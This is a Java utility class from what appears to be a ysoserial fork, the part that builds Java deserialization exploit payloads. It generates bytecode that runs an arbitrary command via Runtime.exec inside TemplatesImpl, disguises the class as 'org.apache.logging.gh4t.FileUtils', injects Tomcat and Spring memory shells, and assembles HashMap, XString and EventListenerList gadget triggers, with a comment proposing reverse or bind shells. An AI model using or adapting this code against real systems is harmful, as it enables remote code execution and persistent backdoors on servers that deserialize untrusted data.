package ysoserial.payloads.util;


import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

import java.io.ByteArrayInputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.Vector;

import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.bytecode.ClassFile;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.codec.binary.Base64;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings ( {
    "restriction", "rawtypes", "unchecked"
} )
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl ( final String tmplType ) throws Exception {
        String[] tmplArgs = tmplType.split(":", 2);

        String command = tmplType;
        if (tmplArgs.length == 2 && tmplArgs[0].equals("memshell")) {
            return createTemplatesImplInjectMemshell(tmplArgs[1]);
        } else if (tmplArgs.length == 2 && tmplArgs[0].equals("cmd")) {
            command = tmplArgs[1];
        } else if (tmplArgs.length == 2 && tmplArgs[0].equals("file")) {
            byte[] fileContent = Files.readAllBytes(Paths.get(tmplArgs[1]));
            return  createTemplatesImpl(fileContent);
        } else if (tmplArgs.length == 2 && tmplArgs[0].equals("base64")) {
            byte[] fileContent = Base64.decodeBase64(tmplArgs[1]);
            return  createTemplatesImpl(fileContent);
        }

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static Object createTemplatesImpl ( final byte[] classBytes ) throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                classBytes,
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(classBytes, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replace("\\", "\\\\").replace("\"", "\\\"") +
            "\");";
        CtClass clazz = pool.makeClass("a");
        // clazz.setSuperclass(pool.get(abstTranslet.getName()));
        // clazz.getClassFile().setMajorVersion(ClassFile.JAVA_6);
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, clazz);
        ctConstructor.setBody(cmd);
        clazz.addConstructor(ctConstructor);

        final byte[] classBytes = clazz.toBytecode();
        clazz.defrost();
        return createTemplatesImpl(classBytes, tplClass, abstTranslet, transFactory);
    }
    public static <T> T createTemplatesImpl ( final byte[] classBytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory ) throws Exception {
        ByteArrayInputStream inputStream = new ByteArrayInputStream(classBytes);
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass(inputStream);
        ctClass.setName("org.apache.logging.gh4t.FileUtils");
        ctClass.setSuperclass(pool.get(abstTranslet.getName()));
        ctClass.getClassFile().setMajorVersion(ClassFile.JAVA_6);

        final T templates = tplClass.newInstance();

        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {ctClass.toBytecode()});
        ctClass.defrost();
        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "a");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static <T> T createTemplatesImplInjectMemshell (String memshellName) throws Exception {
        if (memshellName.indexOf(".") == -1) {
            String memshellPackage = "ysoserial.bullet.template.";
            if (memshellName.startsWith("Tomcat")) {
                memshellName = memshellPackage + "tomcat." + memshellName;
            } else if (memshellName.startsWith("Spring")) {
                memshellName = memshellPackage + "spring." + memshellName;
            }
        }

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(memshellName);
        // ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // ctClass.getClassFile().setMajorVersion(ClassFile.JAVA_6);
        byte[] classBytes = ctClass.toBytecode();
        ctClass.defrost();

        return (T) createTemplatesImpl(classBytes);
    }

    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    /**
     * trigger obj.toString()
     * @param obj
     * @return
     * @throws Exception
     */
    public static Object makeXStringToStringTrigger(Object obj) throws Exception {
        XString xString = new XString("ysomap");
        return makeHashmapEqualsTrigger(obj, xString);
    }

    /**
     * trigger obj2.equals(obj1)
     * @param obj1
     * @param obj2
     * @return
     * @throws Exception
     */
    public static Object makeHashmapEqualsTrigger(Object obj1, Object obj2) throws Exception {
        Map<String, Object> map1 = new HashMap();
        Map<String, Object> map2 = new HashMap();
        map1.put("yy", obj1);
        map1.put("zZ", obj2);

        map2.put("yy", obj2);
        map2.put("zZ", obj1);
        return makeMap(map1, map2);
    }

    /**
     * from readObject ot obj.toString in jdk8/jdk17
     * @param obj
     * @return
     */
    public static Object makeReadObjectToStringTrigger(Object obj) throws Exception {
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) Reflections.getFieldValue(manager, "edits");
        vector.add(obj);
        Reflections.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
        return list;
    }
}
